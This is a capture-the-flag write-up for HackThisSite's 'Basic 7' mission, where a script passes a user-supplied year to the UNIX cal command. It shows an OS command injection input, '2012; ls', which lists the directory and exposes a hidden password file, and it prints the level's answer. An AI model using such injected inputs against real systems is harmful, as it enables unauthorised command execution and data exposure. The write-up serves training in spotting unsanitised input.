# Basic 7

## Challenge Text

> The password is hidden in an unknown file, and Sam has set up a script to display a calendar. Requirements: Basic UNIX command knowledge.

> This time Network Security sam has saved the unencrypted level7 password in an obscurely named file saved in this very directory.

> In other unrelated news, Sam has set up a script that returns the output from the UNIX cal command. Here is the script:

## Writeup

For this challenge we're told that Sam has saved the unencrypted password file in the same directory that executes his publicly available calendar program. This calendar program takes as input a given year and passes it to the UNIX [cal](https://www.geeksforgeeks.org/cal-command-in-linux-with-examples/ "Geeks For Geeks Article On The Linux Cal Command") command. We can first try to use the program as it was intended by providing a random year like 2012, which under the hood looks like this ```cal 2012```. The output is the following.

```
       January 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30  31



       February 2012
Mon Tue Wed Thu Fri Sat Sun
          1   2   3   4   5
  6   7   8   9  10  11  12
 13  14  15  16  17  18  19
 20  21  22  23  24  25  26
 27  28  29



        March 2012
Mon Tue Wed Thu Fri Sat Sun
              1   2   3   4
  5   6   7   8   9  10  11
 12  13  14  15  16  17  18
 19  20  21  22  23  24  25
 26  27  28  29  30  31



        April 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30



         May 2012
Mon Tue Wed Thu Fri Sat Sun
      1   2   3   4   5   6
  7   8   9  10  11  12  13
 14  15  16  17  18  19  20
 21  22  23  24  25  26  27
 28  29  30  31



         June 2012
Mon Tue Wed Thu Fri Sat Sun
                  1   2   3
  4   5   6   7   8   9  10
 11  12  13  14  15  16  17
 18  19  20  21  22  23  24
 25  26  27  28  29  30



         July 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30  31



        August 2012
Mon Tue Wed Thu Fri Sat Sun
          1   2   3   4   5
  6   7   8   9  10  11  12
 13  14  15  16  17  18  19
 20  21  22  23  24  25  26
 27  28  29  30  31



      September 2012
Mon Tue Wed Thu Fri Sat Sun
                      1   2
  3   4   5   6   7   8   9
 10  11  12  13  14  15  16
 17  18  19  20  21  22  23
 24  25  26  27  28  29  30



       October 2012
Mon Tue Wed Thu Fri Sat Sun
  1   2   3   4   5   6   7
  8   9  10  11  12  13  14
 15  16  17  18  19  20  21
 22  23  24  25  26  27  28
 29  30  31



       November 2012
Mon Tue Wed Thu Fri Sat Sun
              1   2   3   4
  5   6   7   8   9  10  11
 12  13  14  15  16  17  18
 19  20  21  22  23  24  25
 26  27  28  29  30



       December 2012
Mon Tue Wed Thu Fri Sat Sun
                      1   2
  3   4   5   6   7   8   9
 10  11  12  13  14  15  16
 17  18  19  20  21  22  23
 24  25  26  27  28  29  30
 31
```

The problem with this program is that if the inputs passed into the program are not properly sanitized/neutralized this will leave the target system open to [OS Injection attacks](https://portswigger.net/web-security/os-command-injection "PortSwigger Article On OS Command Injections"). We can verify the vulnerabilty by appending another command to the year we enter.

To do this we'll have to seperate the first command from our own by using the ```;``` symbol.

**Example** - command-1; command-2; command-3;

To list the contents of the current directory we'll use the following as input to the program.

```2012; ls```

This will list the calendar for 2012 followed by the contents of the current directory.

```

       January 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30  31



       February 2012
Mon Tue Wed Thu Fri Sat Sun
          1   2   3   4   5
  6   7   8   9  10  11  12
 13  14  15  16  17  18  19
 20  21  22  23  24  25  26
 27  28  29



        March 2012
Mon Tue Wed Thu Fri Sat Sun
              1   2   3   4
  5   6   7   8   9  10  11
 12  13  14  15  16  17  18
 19  20  21  22  23  24  25
 26  27  28  29  30  31



        April 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30



         May 2012
Mon Tue Wed Thu Fri Sat Sun
      1   2   3   4   5   6
  7   8   9  10  11  12  13
 14  15  16  17  18  19  20
 21  22  23  24  25  26  27
 28  29  30  31



         June 2012
Mon Tue Wed Thu Fri Sat Sun
                  1   2   3
  4   5   6   7   8   9  10
 11  12  13  14  15  16  17
 18  19  20  21  22  23  24
 25  26  27  28  29  30



         July 2012
Mon Tue Wed Thu Fri Sat Sun
                          1
  2   3   4   5   6   7   8
  9  10  11  12  13  14  15
 16  17  18  19  20  21  22
 23  24  25  26  27  28  29
 30  31



        August 2012
Mon Tue Wed Thu Fri Sat Sun
          1   2   3   4   5
  6   7   8   9  10  11  12
 13  14  15  16  17  18  19
 20  21  22  23  24  25  26
 27  28  29  30  31



      September 2012
Mon Tue Wed Thu Fri Sat Sun
                      1   2
  3   4   5   6   7   8   9
 10  11  12  13  14  15  16
 17  18  19  20  21  22  23
 24  25  26  27  28  29  30



       October 2012
Mon Tue Wed Thu Fri Sat Sun
  1   2   3   4   5   6   7
  8   9  10  11  12  13  14
 15  16  17  18  19  20  21
 22  23  24  25  26  27  28
 29  30  31



       November 2012
Mon Tue Wed Thu Fri Sat Sun
              1   2   3   4
  5   6   7   8   9  10  11
 12  13  14  15  16  17  18
 19  20  21  22  23  24  25
 26  27  28  29  30



       December 2012
Mon Tue Wed Thu Fri Sat Sun
                      1   2
  3   4   5   6   7   8   9
 10  11  12  13  14  15  16
 17  18  19  20  21  22  23
 24  25  26  27  28  29  30
 31


index.php
level7.php
cal.pl
.
..
k1kh31b1n55h.php
```

In the output we'll see the obscurely named file mentioned earlier named ```k1kh31b1n55h.php```. Now we can read its contents by navigating to it's location at https://www.hackthissite.org/missions/basic/7/k1kh31b1n55h.php, where we'll find our password.

```7bf92f21```